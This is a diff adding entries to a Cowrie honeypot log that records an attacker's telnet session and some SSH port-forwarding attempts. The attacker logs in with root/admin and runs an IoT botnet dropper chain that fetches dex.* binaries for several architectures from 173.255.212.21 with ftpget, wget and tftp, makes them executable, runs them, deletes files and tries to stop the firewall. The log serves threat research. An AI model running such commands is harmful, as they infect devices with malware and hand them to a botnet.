@@ -2054,3 +2054,160 @@
 2017-03-19T14:32:51+0000 [HoneyPotSSHTransport,37766,122.226.100.116] Connection lost after 3 seconds
 2017-03-19T14:32:55+0000 [CowrieTelnetTransport,89901,67.229.141.98] Connection lost after 50 seconds
 2017-03-19T14:32:59+0000 [CowrieTelnetTransport,89900,67.229.141.98] Connection lost after 54 seconds
+2017-03-19T14:33:02+0000 [SSHChannel None (78) on SSHService 'ssh-connection' on HoneyPotSSHTransport,37437,91.195.103.179] remote eof
+2017-03-19T14:33:02+0000 [SSHChannel None (78) on SSHService 'ssh-connection' on HoneyPotSSHTransport,37437,91.195.103.179] remote close
+2017-03-19T14:33:02+0000 [SSHChannel None (78) on SSHService 'ssh-connection' on HoneyPotSSHTransport,37437,91.195.103.179] sending close 78
+2017-03-19T14:33:03+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 88.250.2.126:50458 (10.8.41.81:2223) [session: TT89902]
+2017-03-19T14:33:03+0000 [CowrieTelnetTransport,89902,88.250.2.126] first time for 88.250.2.126, need: 1
+2017-03-19T14:33:03+0000 [CowrieTelnetTransport,89902,88.250.2.126] login attempt: 1
+2017-03-19T14:33:05+0000 [CowrieTelnetTransport,89902,88.250.2.126] login attempt [root/admin] succeeded
+2017-03-19T14:33:08+0000 [CowrieTelnetTransport,89902,88.250.2.126] Opening TTY Log: log/tty/20170319-143308-None-89902i.log
+2017-03-19T14:33:08+0000 [CowrieTelnetTransport,89902,88.250.2.126] Warning: state changed and new state returned
+2017-03-19T14:33:08+0000 [CowrieTelnetTransport,89902,88.250.2.126] CMD: enable
+2017-03-19T14:33:08+0000 [CowrieTelnetTransport,89902,88.250.2.126] Command found: enable 
+2017-03-19T14:33:08+0000 [CowrieTelnetTransport,89902,88.250.2.126] Reading txtcmd from "txtcmds/bin/enable"
+2017-03-19T14:33:08+0000 [CowrieTelnetTransport,89902,88.250.2.126] CMD: shell
+2017-03-19T14:33:08+0000 [CowrieTelnetTransport,89902,88.250.2.126] Command not found: shell
+2017-03-19T14:33:08+0000 [CowrieTelnetTransport,89902,88.250.2.126] CMD: sh
+2017-03-19T14:33:08+0000 [CowrieTelnetTransport,89902,88.250.2.126] Command found: sh 
+2017-03-19T14:33:08+0000 [CowrieTelnetTransport,89902,88.250.2.126] CMD: /bin/busybox d4rk3v1l
+2017-03-19T14:33:08+0000 [CowrieTelnetTransport,89902,88.250.2.126] Command found: /bin/busybox d4rk3v1l
+2017-03-19T14:33:08+0000 [CowrieTelnetTransport,89902,88.250.2.126] CMD: cd /tmp 2>&1 && mkdir -p ... 2>&1 || cd /var 2>&1 && mkdir -p ... 2>&1 || cd /mnt 2>&1 && mkdir -p ... 2>&1 || cd /root 2>&1 && mkdir -p ... 2>&1 || cd / 2>&1 && mkdir -p ... 2>&1; cd ...; rm -f *;
+2017-03-19T14:33:08+0000 [CowrieTelnetTransport,89902,88.250.2.126] Command found: cd /tmp 2 >& 1
+2017-03-19T14:33:08+0000 [CowrieTelnetTransport,89902,88.250.2.126] Command found: mkdir -p ... 2 >& 1
+2017-03-19T14:33:08+0000 [CowrieTelnetTransport,89902,88.250.2.126] Command found: cd /var 2 >& 1
+2017-03-19T14:33:08+0000 [CowrieTelnetTransport,89902,88.250.2.126] Command found: mkdir -p ... 2 >& 1
+2017-03-19T14:33:08+0000 [CowrieTelnetTransport,89902,88.250.2.126] Command found: cd /mnt 2 >& 1
+2017-03-19T14:33:08+0000 [CowrieTelnetTransport,89902,88.250.2.126] Command found: mkdir -p ... 2 >& 1
+2017-03-19T14:33:08+0000 [CowrieTelnetTransport,89902,88.250.2.126] Command found: cd /root 2 >& 1
+2017-03-19T14:33:08+0000 [CowrieTelnetTransport,89902,88.250.2.126] Command found: mkdir -p ... 2 >& 1
+2017-03-19T14:33:08+0000 [CowrieTelnetTransport,89902,88.250.2.126] Command found: cd / 2 >& 1
+2017-03-19T14:33:08+0000 [CowrieTelnetTransport,89902,88.250.2.126] Command found: mkdir -p ... 2 >& 1
+2017-03-19T14:33:08+0000 [CowrieTelnetTransport,89902,88.250.2.126] Command found: cd ...
+2017-03-19T14:33:08+0000 [CowrieTelnetTransport,89902,88.250.2.126] Command found: rm -f /lost+found /vmlinuz /srv /sys /run /sbin /proc /mnt /bin /usr /tmp /var /initrd.img /etc /opt /boot /selinux /home /media /lib /root /dev /-p
+2017-03-19T14:33:08+0000 [CowrieTelnetTransport,89902,88.250.2.126] CMD: killall -9 dex.arm; ftpget -u ftp 173.255.212.21 ./dex.arm dex.arm 2>&1 || wget http://173.255.212.21/dex.arm -O ./dex.arm 2>&1 || tftp -g -r dex.arm -l ./dex.arm 173.255.212.21 2>&1; chmod +x dex.arm; ./dex.arm;
+2017-03-19T14:33:08+0000 [CowrieTelnetTransport,89902,88.250.2.126] Command found: killall -9 dex.arm
+2017-03-19T14:33:08+0000 [CowrieTelnetTransport,89902,88.250.2.126] Reading txtcmd from "txtcmds/usr/bin/killall"
+2017-03-19T14:33:08+0000 [CowrieTelnetTransport,89902,88.250.2.126] Command found: ftpget -u ftp 173.255.212.21 ./dex.arm dex.arm 2 >& 1
+2017-03-19T14:33:11+0000 [CowrieTelnetTransport,89902,88.250.2.126] Downloaded URL (ftp://173.255.212.21/dex.arm) with SHA-256 5d370d27a19be8c7a2593f8d824c3240cb761473490420530f15d72121491b7c to dl/5d370d27a19be8c7a2593f8d824c3240cb761473490420530f15d72121491b7c
+2017-03-19T14:33:11+0000 [CowrieTelnetTransport,89902,88.250.2.126] Command found: wget http://173.255.212.21/dex.arm -O /dex.arm 2 >& 1
+2017-03-19T14:33:11+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://173.255.212.21/dex.arm>
+2017-03-19T14:33:12+0000 [HTTPPageDownloader,client] Not storing duplicate content 5d370d27a19be8c7a2593f8d824c3240cb761473490420530f15d72121491b7c
+2017-03-19T14:33:12+0000 [HTTPPageDownloader,client] Downloaded URL (http://173.255.212.21/dex.arm) with SHA-256 5d370d27a19be8c7a2593f8d824c3240cb761473490420530f15d72121491b7c to dl/5d370d27a19be8c7a2593f8d824c3240cb761473490420530f15d72121491b7c
+2017-03-19T14:33:12+0000 [HTTPPageDownloader,client] Command found: tftp -g -r /dex.arm -l /dex.arm 173.255.212.21 2 >& 1
+2017-03-19T14:33:12+0000 [HTTPPageDownloader,client] Command found: chmod +x /dex.arm
+2017-03-19T14:33:12+0000 [HTTPPageDownloader,client] Command not found: ./dex.arm
+2017-03-19T14:33:12+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://173.255.212.21/dex.arm>
+2017-03-19T14:33:12+0000 [CowrieTelnetTransport,89902,88.250.2.126] CMD: killall -9 dex.ppc; rm -f dex.arm; ftpget -u ftp 173.255.212.21 ./dex.ppc dex.ppc 2>&1 || wget http://173.255.212.21/dex.ppc -O ./dex.ppc 2>&1 || tftp -g -r dex.ppc -l ./dex.ppc 173.255.212.21 2>&1; chmod +x dex.ppc; ./dex.ppc;
+2017-03-19T14:33:12+0000 [CowrieTelnetTransport,89902,88.250.2.126] Command found: killall -9 dex.ppc
+2017-03-19T14:33:12+0000 [CowrieTelnetTransport,89902,88.250.2.126] Reading txtcmd from "txtcmds/usr/bin/killall"
+2017-03-19T14:33:12+0000 [CowrieTelnetTransport,89902,88.250.2.126] Command found: rm -f /dex.arm
+2017-03-19T14:33:12+0000 [CowrieTelnetTransport,89902,88.250.2.126] Command found: ftpget -u ftp 173.255.212.21 ./dex.ppc dex.ppc 2 >& 1
+2017-03-19T14:33:14+0000 [CowrieTelnetTransport,89902,88.250.2.126] Downloaded URL (ftp://173.255.212.21/dex.ppc) with SHA-256 852560aeb3d482c925f34667626deefaaf21af10b4614b14f88c3864cbd60c37 to dl/852560aeb3d482c925f34667626deefaaf21af10b4614b14f88c3864cbd60c37
+2017-03-19T14:33:14+0000 [CowrieTelnetTransport,89902,88.250.2.126] Command found: wget http://173.255.212.21/dex.ppc -O /dex.ppc 2 >& 1
+2017-03-19T14:33:14+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://173.255.212.21/dex.ppc>
+2017-03-19T14:33:15+0000 [HTTPPageDownloader,client] Not storing duplicate content 852560aeb3d482c925f34667626deefaaf21af10b4614b14f88c3864cbd60c37
+2017-03-19T14:33:15+0000 [HTTPPageDownloader,client] Downloaded URL (http://173.255.212.21/dex.ppc) with SHA-256 852560aeb3d482c925f34667626deefaaf21af10b4614b14f88c3864cbd60c37 to dl/852560aeb3d482c925f34667626deefaaf21af10b4614b14f88c3864cbd60c37
+2017-03-19T14:33:15+0000 [HTTPPageDownloader,client] Command found: tftp -g -r /dex.ppc -l /dex.ppc 173.255.212.21 2 >& 1
+2017-03-19T14:33:15+0000 [HTTPPageDownloader,client] Command found: chmod +x /dex.ppc
+2017-03-19T14:33:15+0000 [HTTPPageDownloader,client] Command not found: ./dex.ppc
+2017-03-19T14:33:15+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://173.255.212.21/dex.ppc>
+2017-03-19T14:33:15+0000 [CowrieTelnetTransport,89902,88.250.2.126] CMD: killall -9 dex.sph; rm -f dex.ppc; ftpget -u ftp 173.255.212.21 ./dex.sph dex.sph 2>&1 || wget http://173.255.212.21/dex.sph -O ./dex.sph 2>&1 || tftp -g -r dex.sph -l ./dex.sph 173.255.212.21 2>&1; chmod +x dex.sph; ./dex.sph;
+2017-03-19T14:33:15+0000 [CowrieTelnetTransport,89902,88.250.2.126] Command found: killall -9 dex.sph
+2017-03-19T14:33:15+0000 [CowrieTelnetTransport,89902,88.250.2.126] Reading txtcmd from "txtcmds/usr/bin/killall"
+2017-03-19T14:33:15+0000 [CowrieTelnetTransport,89902,88.250.2.126] Command found: rm -f /dex.ppc
+2017-03-19T14:33:15+0000 [CowrieTelnetTransport,89902,88.250.2.126] Command found: ftpget -u ftp 173.255.212.21 ./dex.sph dex.sph 2 >& 1
+2017-03-19T14:33:17+0000 [CowrieTelnetTransport,89902,88.250.2.126] Downloaded URL (ftp://173.255.212.21/dex.sph) with SHA-256 3f5f580c2fe87788bf5eb5a1571ee723914ebe47eb788b6105d4df3f6b3890ad to dl/3f5f580c2fe87788bf5eb5a1571ee723914ebe47eb788b6105d4df3f6b3890ad
+2017-03-19T14:33:17+0000 [CowrieTelnetTransport,89902,88.250.2.126] Command found: wget http://173.255.212.21/dex.sph -O /dex.sph 2 >& 1
+2017-03-19T14:33:17+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://173.255.212.21/dex.sph>
+2017-03-19T14:33:18+0000 [HTTPPageDownloader,client] Not storing duplicate content 3f5f580c2fe87788bf5eb5a1571ee723914ebe47eb788b6105d4df3f6b3890ad
+2017-03-19T14:33:18+0000 [HTTPPageDownloader,client] Downloaded URL (http://173.255.212.21/dex.sph) with SHA-256 3f5f580c2fe87788bf5eb5a1571ee723914ebe47eb788b6105d4df3f6b3890ad to dl/3f5f580c2fe87788bf5eb5a1571ee723914ebe47eb788b6105d4df3f6b3890ad
+2017-03-19T14:33:18+0000 [HTTPPageDownloader,client] Command found: tftp -g -r /dex.sph -l /dex.sph 173.255.212.21 2 >& 1
+2017-03-19T14:33:18+0000 [HTTPPageDownloader,client] Command found: chmod +x /dex.sph
+2017-03-19T14:33:18+0000 [HTTPPageDownloader,client] Command not found: ./dex.sph
+2017-03-19T14:33:18+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://173.255.212.21/dex.sph>
+2017-03-19T14:33:18+0000 [CowrieTelnetTransport,89902,88.250.2.126] CMD: killall -9 dex.mpl; rm -f dex.sph; ftpget -u ftp 173.255.212.21 ./dex.mpl dex.mpl 2>&1 || wget http://173.255.212.21/dex.mpl -O ./dex.mpl 2>&1 || tftp -g -r dex.mpl -l ./dex.mpl 173.255.212.21 2>&1; chmod +x dex.mpl; ./dex.mpl;
+2017-03-19T14:33:18+0000 [CowrieTelnetTransport,89902,88.250.2.126] Command found: killall -9 dex.mpl
+2017-03-19T14:33:18+0000 [CowrieTelnetTransport,89902,88.250.2.126] Reading txtcmd from "txtcmds/usr/bin/killall"
+2017-03-19T14:33:18+0000 [CowrieTelnetTransport,89902,88.250.2.126] Command found: rm -f /dex.sph
+2017-03-19T14:33:18+0000 [CowrieTelnetTransport,89902,88.250.2.126] Command found: ftpget -u ftp 173.255.212.21 ./dex.mpl dex.mpl 2 >& 1
+2017-03-19T14:33:20+0000 [CowrieTelnetTransport,89902,88.250.2.126] Downloaded URL (ftp://173.255.212.21/dex.mpl) with SHA-256 811508920dee904659dff2f33b4ef9acf9bf0aabe7bf2d0b0573f0b0503f1a65 to dl/811508920dee904659dff2f33b4ef9acf9bf0aabe7bf2d0b0573f0b0503f1a65
+2017-03-19T14:33:20+0000 [CowrieTelnetTransport,89902,88.250.2.126] Command found: wget http://173.255.212.21/dex.mpl -O /dex.mpl 2 >& 1
+2017-03-19T14:33:20+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://173.255.212.21/dex.mpl>
+2017-03-19T14:33:21+0000 [HTTPPageDownloader,client] Not storing duplicate content 811508920dee904659dff2f33b4ef9acf9bf0aabe7bf2d0b0573f0b0503f1a65
+2017-03-19T14:33:21+0000 [HTTPPageDownloader,client] Downloaded URL (http://173.255.212.21/dex.mpl) with SHA-256 811508920dee904659dff2f33b4ef9acf9bf0aabe7bf2d0b0573f0b0503f1a65 to dl/811508920dee904659dff2f33b4ef9acf9bf0aabe7bf2d0b0573f0b0503f1a65
+2017-03-19T14:33:21+0000 [HTTPPageDownloader,client] Command found: tftp -g -r /dex.mpl -l /dex.mpl 173.255.212.21 2 >& 1
+2017-03-19T14:33:21+0000 [HTTPPageDownloader,client] Command found: chmod +x /dex.mpl
+2017-03-19T14:33:21+0000 [HTTPPageDownloader,client] Command not found: ./dex.mpl
+2017-03-19T14:33:21+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://173.255.212.21/dex.mpl>
+2017-03-19T14:33:21+0000 [CowrieTelnetTransport,89902,88.250.2.126] CMD: killall -9 dex.mps; rm -f dex.mpl; ftpget -u ftp 173.255.212.21 ./dex.mps dex.mps 2>&1 || wget http://173.255.212.21/dex.mps -O ./dex.mps 2>&1 || tftp -g -r dex.mps -l ./dex.mps 173.255.212.21 2>&1; chmod +x dex.mps; ./dex.mps;
+2017-03-19T14:33:21+0000 [CowrieTelnetTransport,89902,88.250.2.126] Command found: killall -9 dex.mps
+2017-03-19T14:33:21+0000 [CowrieTelnetTransport,89902,88.250.2.126] Reading txtcmd from "txtcmds/usr/bin/killall"
+2017-03-19T14:33:21+0000 [CowrieTelnetTransport,89902,88.250.2.126] Command found: rm -f /dex.mpl
+2017-03-19T14:33:21+0000 [CowrieTelnetTransport,89902,88.250.2.126] Command found: ftpget -u ftp 173.255.212.21 ./dex.mps dex.mps 2 >& 1
+2017-03-19T14:33:23+0000 [CowrieTelnetTransport,89902,88.250.2.126] Downloaded URL (ftp://173.255.212.21/dex.mps) with SHA-256 05cc7f643ea03707106dce4162c1740d7431411570f7e3b438ee2f236c98d0a6 to dl/05cc7f643ea03707106dce4162c1740d7431411570f7e3b438ee2f236c98d0a6
+2017-03-19T14:33:23+0000 [CowrieTelnetTransport,89902,88.250.2.126] Command found: wget http://173.255.212.21/dex.mps -O /dex.mps 2 >& 1
+2017-03-19T14:33:23+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://173.255.212.21/dex.mps>
+2017-03-19T14:33:23+0000 [HTTPPageDownloader,client] Not storing duplicate content 05cc7f643ea03707106dce4162c1740d7431411570f7e3b438ee2f236c98d0a6
+2017-03-19T14:33:23+0000 [HTTPPageDownloader,client] Downloaded URL (http://173.255.212.21/dex.mps) with SHA-256 05cc7f643ea03707106dce4162c1740d7431411570f7e3b438ee2f236c98d0a6 to dl/05cc7f643ea03707106dce4162c1740d7431411570f7e3b438ee2f236c98d0a6
+2017-03-19T14:33:23+0000 [HTTPPageDownloader,client] Command found: tftp -g -r /dex.mps -l /dex.mps 173.255.212.21 2 >& 1
+2017-03-19T14:33:23+0000 [HTTPPageDownloader,client] Command found: chmod +x /dex.mps
+2017-03-19T14:33:23+0000 [HTTPPageDownloader,client] Command not found: ./dex.mps
+2017-03-19T14:33:23+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://173.255.212.21/dex.mps>
+2017-03-19T14:33:24+0000 [CowrieTelnetTransport,89902,88.250.2.126] CMD: killall -9 dex.x86; rm -f dex.mps; ftpget -u ftp 173.255.212.21 ./dex.x86 dex.x86 2>&1 || wget http://173.255.212.21/dex.x86 -O ./dex.x86 2>&1 || tftp -g -r dex.x86 -l ./dex.x86 173.255.212.21 2>&1; chmod +x dex.x86; ./dex.x86;
+2017-03-19T14:33:24+0000 [CowrieTelnetTransport,89902,88.250.2.126] Command found: killall -9 dex.x86
+2017-03-19T14:33:24+0000 [CowrieTelnetTransport,89902,88.250.2.126] Reading txtcmd from "txtcmds/usr/bin/killall"
+2017-03-19T14:33:24+0000 [CowrieTelnetTransport,89902,88.250.2.126] Command found: rm -f /dex.mps
+2017-03-19T14:33:24+0000 [CowrieTelnetTransport,89902,88.250.2.126] Command found: ftpget -u ftp 173.255.212.21 ./dex.x86 dex.x86 2 >& 1
+2017-03-19T14:33:26+0000 [CowrieTelnetTransport,89902,88.250.2.126] Downloaded URL (ftp://173.255.212.21/dex.x86) with SHA-256 0cc8c7d517e7fabfdaf871bc96726c70f631198d9a15a5ab1352fb46c0f86b36 to dl/0cc8c7d517e7fabfdaf871bc96726c70f631198d9a15a5ab1352fb46c0f86b36
+2017-03-19T14:33:26+0000 [CowrieTelnetTransport,89902,88.250.2.126] Command found: wget http://173.255.212.21/dex.x86 -O /dex.x86 2 >& 1
+2017-03-19T14:33:26+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://173.255.212.21/dex.x86>
+2017-03-19T14:33:26+0000 [HTTPPageDownloader,client] Not storing duplicate content 0cc8c7d517e7fabfdaf871bc96726c70f631198d9a15a5ab1352fb46c0f86b36
+2017-03-19T14:33:26+0000 [HTTPPageDownloader,client] Downloaded URL (http://173.255.212.21/dex.x86) with SHA-256 0cc8c7d517e7fabfdaf871bc96726c70f631198d9a15a5ab1352fb46c0f86b36 to dl/0cc8c7d517e7fabfdaf871bc96726c70f631198d9a15a5ab1352fb46c0f86b36
+2017-03-19T14:33:26+0000 [HTTPPageDownloader,client] Command found: tftp -g -r /dex.x86 -l /dex.x86 173.255.212.21 2 >& 1
+2017-03-19T14:33:26+0000 [HTTPPageDownloader,client] Command found: chmod +x /dex.x86
+2017-03-19T14:33:26+0000 [HTTPPageDownloader,client] Command not found: ./dex.x86
+2017-03-19T14:33:26+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://173.255.212.21/dex.x86>
+2017-03-19T14:33:26+0000 [CowrieTelnetTransport,89902,88.250.2.126] CMD: rm -f dex.x86; /etc/firewall_stop
+2017-03-19T14:33:26+0000 [CowrieTelnetTransport,89902,88.250.2.126] Command found: rm -f /dex.x86
+2017-03-19T14:33:26+0000 [CowrieTelnetTransport,89902,88.250.2.126] Command not found: /etc/firewall_stop
+2017-03-19T14:33:26+0000 [CowrieTelnetTransport,89902,88.250.2.126] Not storing duplicate content 5d370d27a19be8c7a2593f8d824c3240cb761473490420530f15d72121491b7c
+2017-03-19T14:33:26+0000 [CowrieTelnetTransport,89902,88.250.2.126] Saved redir contents with SHA-256 5d370d27a19be8c7a2593f8d824c3240cb761473490420530f15d72121491b7c to dl/5d370d27a19be8c7a2593f8d824c3240cb761473490420530f15d72121491b7c
+2017-03-19T14:33:26+0000 [CowrieTelnetTransport,89902,88.250.2.126] Not storing duplicate content 05cc7f643ea03707106dce4162c1740d7431411570f7e3b438ee2f236c98d0a6
+2017-03-19T14:33:26+0000 [CowrieTelnetTransport,89902,88.250.2.126] Saved redir contents with SHA-256 05cc7f643ea03707106dce4162c1740d7431411570f7e3b438ee2f236c98d0a6 to dl/05cc7f643ea03707106dce4162c1740d7431411570f7e3b438ee2f236c98d0a6
+2017-03-19T14:33:26+0000 [CowrieTelnetTransport,89902,88.250.2.126] Not storing duplicate content 852560aeb3d482c925f34667626deefaaf21af10b4614b14f88c3864cbd60c37
+2017-03-19T14:33:26+0000 [CowrieTelnetTransport,89902,88.250.2.126] Saved redir contents with SHA-256 852560aeb3d482c925f34667626deefaaf21af10b4614b14f88c3864cbd60c37 to dl/852560aeb3d482c925f34667626deefaaf21af10b4614b14f88c3864cbd60c37
+2017-03-19T14:33:26+0000 [CowrieTelnetTransport,89902,88.250.2.126] Not storing duplicate content 852560aeb3d482c925f34667626deefaaf21af10b4614b14f88c3864cbd60c37
+2017-03-19T14:33:26+0000 [CowrieTelnetTransport,89902,88.250.2.126] Saved redir contents with SHA-256 852560aeb3d482c925f34667626deefaaf21af10b4614b14f88c3864cbd60c37 to dl/852560aeb3d482c925f34667626deefaaf21af10b4614b14f88c3864cbd60c37
+2017-03-19T14:33:26+0000 [CowrieTelnetTransport,89902,88.250.2.126] Not storing duplicate content 0cc8c7d517e7fabfdaf871bc96726c70f631198d9a15a5ab1352fb46c0f86b36
+2017-03-19T14:33:26+0000 [CowrieTelnetTransport,89902,88.250.2.126] Saved redir contents with SHA-256 0cc8c7d517e7fabfdaf871bc96726c70f631198d9a15a5ab1352fb46c0f86b36 to dl/0cc8c7d517e7fabfdaf871bc96726c70f631198d9a15a5ab1352fb46c0f86b36
+2017-03-19T14:33:26+0000 [CowrieTelnetTransport,89902,88.250.2.126] Not storing duplicate content 811508920dee904659dff2f33b4ef9acf9bf0aabe7bf2d0b0573f0b0503f1a65
+2017-03-19T14:33:26+0000 [CowrieTelnetTransport,89902,88.250.2.126] Saved redir contents with SHA-256 811508920dee904659dff2f33b4ef9acf9bf0aabe7bf2d0b0573f0b0503f1a65 to dl/811508920dee904659dff2f33b4ef9acf9bf0aabe7bf2d0b0573f0b0503f1a65
+2017-03-19T14:33:26+0000 [CowrieTelnetTransport,89902,88.250.2.126] Not storing duplicate content 811508920dee904659dff2f33b4ef9acf9bf0aabe7bf2d0b0573f0b0503f1a65
+2017-03-19T14:33:26+0000 [CowrieTelnetTransport,89902,88.250.2.126] Saved redir contents with SHA-256 811508920dee904659dff2f33b4ef9acf9bf0aabe7bf2d0b0573f0b0503f1a65 to dl/811508920dee904659dff2f33b4ef9acf9bf0aabe7bf2d0b0573f0b0503f1a65
+2017-03-19T14:33:26+0000 [CowrieTelnetTransport,89902,88.250.2.126] Not storing duplicate content 0cc8c7d517e7fabfdaf871bc96726c70f631198d9a15a5ab1352fb46c0f86b36
+2017-03-19T14:33:26+0000 [CowrieTelnetTransport,89902,88.250.2.126] Saved redir contents with SHA-256 0cc8c7d517e7fabfdaf871bc96726c70f631198d9a15a5ab1352fb46c0f86b36 to dl/0cc8c7d517e7fabfdaf871bc96726c70f631198d9a15a5ab1352fb46c0f86b36
+2017-03-19T14:33:26+0000 [CowrieTelnetTransport,89902,88.250.2.126] Not storing duplicate content 5d370d27a19be8c7a2593f8d824c3240cb761473490420530f15d72121491b7c
+2017-03-19T14:33:26+0000 [CowrieTelnetTransport,89902,88.250.2.126] Saved redir contents with SHA-256 5d370d27a19be8c7a2593f8d824c3240cb761473490420530f15d72121491b7c to dl/5d370d27a19be8c7a2593f8d824c3240cb761473490420530f15d72121491b7c
+2017-03-19T14:33:26+0000 [CowrieTelnetTransport,89902,88.250.2.126] Not storing duplicate content 05cc7f643ea03707106dce4162c1740d7431411570f7e3b438ee2f236c98d0a6
+2017-03-19T14:33:26+0000 [CowrieTelnetTransport,89902,88.250.2.126] Saved redir contents with SHA-256 05cc7f643ea03707106dce4162c1740d7431411570f7e3b438ee2f236c98d0a6 to dl/05cc7f643ea03707106dce4162c1740d7431411570f7e3b438ee2f236c98d0a6
+2017-03-19T14:33:26+0000 [CowrieTelnetTransport,89902,88.250.2.126] Not storing duplicate content 3f5f580c2fe87788bf5eb5a1571ee723914ebe47eb788b6105d4df3f6b3890ad
+2017-03-19T14:33:26+0000 [CowrieTelnetTransport,89902,88.250.2.126] Saved redir contents with SHA-256 3f5f580c2fe87788bf5eb5a1571ee723914ebe47eb788b6105d4df3f6b3890ad to dl/3f5f580c2fe87788bf5eb5a1571ee723914ebe47eb788b6105d4df3f6b3890ad
+2017-03-19T14:33:26+0000 [CowrieTelnetTransport,89902,88.250.2.126] Not storing duplicate content 3f5f580c2fe87788bf5eb5a1571ee723914ebe47eb788b6105d4df3f6b3890ad
+2017-03-19T14:33:26+0000 [CowrieTelnetTransport,89902,88.250.2.126] Saved redir contents with SHA-256 3f5f580c2fe87788bf5eb5a1571ee723914ebe47eb788b6105d4df3f6b3890ad to dl/3f5f580c2fe87788bf5eb5a1571ee723914ebe47eb788b6105d4df3f6b3890ad
+2017-03-19T14:33:26+0000 [CowrieTelnetTransport,89902,88.250.2.126] Closing TTY Log: log/tty/20170319-143308-None-89902i.log after 18 seconds
+2017-03-19T14:33:26+0000 [CowrieTelnetTransport,89902,88.250.2.126] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-03-19T14:33:26+0000 [CowrieTelnetTransport,89902,88.250.2.126] Connection lost after 23 seconds
+2017-03-19T14:33:50+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,37732,194.88.107.22] got channel 'direct-tcpip' request
+2017-03-19T14:33:50+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,37732,194.88.107.22] direct-tcp connection request to 188.125.69.79:25 from localhost:5556
+2017-03-19T14:33:58+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,37762,194.88.107.28] got channel 'direct-tcpip' request
+2017-03-19T14:33:58+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,37762,194.88.107.28] direct-tcp connection request to 23.216.242.144:443 from localhost:5556
+2017-03-19T14:33:58+0000 [SSHChannel None (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,37762,194.88.107.28] direct-tcp forward to 23.216.242.144:443 with data '\x16\x03\x01\x01I\x01\x00\x01E\x03\x01X\xce\x96\xc7c\x9b8$\x8f\xd3\x90\xbd\xdb*\xde\x1c\xcf\xa2F\x9b\x88~v=\xccdA\xab\x03$zJ\x00\x00\x1c\xc0\x14\xc0\x13\x009\x003\x005\x00/\xc0\n\xc0\t\x008\x002\x00\n\x00\x13\x00\x05\x00\x04\x01\x00\x01\x00\x00\x00\x00\x1f\x00\x1d\x00\x00\x1aauth.np.ac.playstation.net\x00\n\x00\x06\x00\x04\x00\x17\x00\x18\x00\x0b\x00\x02\x01\x00\x00#\x00\xc0\x00\x00\x19\x9eQu\x9c\xed\x7fn\x1e\xdd\xccD\x88d\x04\xa9\xfb\xea\x9d0/m9M0\x8f\xedK\x85\x1cZ\x98(,\xa8W)Ny\xf3\xe1P\x95\\\xb3~\x1c\xcaN\x14\x92b\xddy\x9e\xb6\xa4\xa8:\x1c\xe20\x96\xec4<rt\xf6\x8d\x97\xae\xcb-\x806\xd9N\x9bY\x87\x07p\xcca0h$GFB\x0f\x9e@d\xc2,\x0f\x15;\x1bx\xd6\x05\xc5\x18\x13\xfb:-\xfe\xcf\xcb\xa0\x0f`\xd0g\xa0\xe7A\xf4\xb6\xc4d\x93JK\x92/K\xd0\x97\xf5\xc2\xd4*\x82sa\x06\xd0\xf3\x17d\x18H^\xe9\x80\x96O\xeb\xf0v\x1de\x87\x93k"]\x1e,DO\xc59\xcd\xc7Gz\x92\x13\x8b@\xdb2I^\xd8\xb22"\xa6r\xfc]r\xe4\x00\x17\x00\x00\xff\x01\x00\x01\x00'
+2017-03-19T14:33:58+0000 [SSHChannel None (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,37762,194.88.107.28] failed to connect: Connection refused
+2017-03-19T14:33:58+0000 [SSHChannel None (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,37762,194.88.107.28] sending close 0
+2017-03-19T14:33:59+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 122.226.100.116:54487 (10.8.41.81:2222) [session: c8259c2d]
+2017-03-19T14:34:00+0000 [HoneyPotSSHTransport,37767,122.226.100.116] Remote SSH version: SSH-2.0-libssh2_1.6.0
+2017-03-19T14:34:00+0000 [HoneyPotSSHTransport,37767,122.226.100.116] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-03-19T14:34:00+0000 [HoneyPotSSHTransport,37767,122.226.100.116] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-03-19T14:34:00+0000 [HoneyPotSSHTransport,37767,122.226.100.116] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
